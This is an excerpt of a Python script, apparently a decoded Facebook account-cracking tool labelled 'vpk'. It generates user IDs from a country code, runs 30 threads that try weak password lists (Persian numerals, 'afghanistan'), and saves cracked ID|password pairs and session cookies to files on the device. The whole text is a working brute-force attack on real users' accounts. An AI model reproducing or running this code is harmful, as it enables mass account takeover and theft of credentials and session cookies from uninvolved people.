#DECODE/BY/SaManDar
#vpk
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.vpk')
...
def api1(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [vpk-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/vpk-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [vpk-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/vpk-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/vpk-CP.txt','a').write(ids+'|'+pas+'\n')
...
def AFG():
		...
		with tred(max_workers=30) as FKING:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'afghanistan','Afghanistan','۱۲۳۴۵۶','۱٠٠۲٠٠','۳٠٠۴٠٠','۵٠٠۶٠٠','۷٠٠۸٠٠','۹٠٠٠۱٠٠٠','۱٠٠٠۲٠٠٠','۳٠٠٠۴٠٠٠','۵٠٠٠۶٠٠٠','100200','500600','10002000','70007000','700700','100100','200200','50005000','500500')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/vpk-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/vpk,-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
